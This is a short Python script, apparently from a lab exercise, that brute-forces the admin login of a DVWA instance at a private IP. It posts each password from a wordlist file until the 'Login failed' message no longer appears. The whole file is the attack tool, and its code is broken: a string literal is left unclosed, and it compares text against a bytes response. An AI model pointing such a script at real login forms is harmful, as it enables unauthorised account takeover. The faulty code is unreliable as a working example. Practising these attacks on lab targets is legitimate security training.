#!/usr/bin/env python
import requests

targetURL = "http://10.0.2.14/dvwa/login.php"
dataDict = {"username": "admin, "password": "", "Login": "submit"}

with open("/home/kali/Downloads/password.list", "r") as wordList:
	for line in wordList:
		word = line.strip()
		dataDict["password"] = word
		response = requests.post(targetURL, data=dataDict)
		if "Login failed" not in response.content:
			print("[+] Password -->" + word)
			exit()
print("[-] EOF")
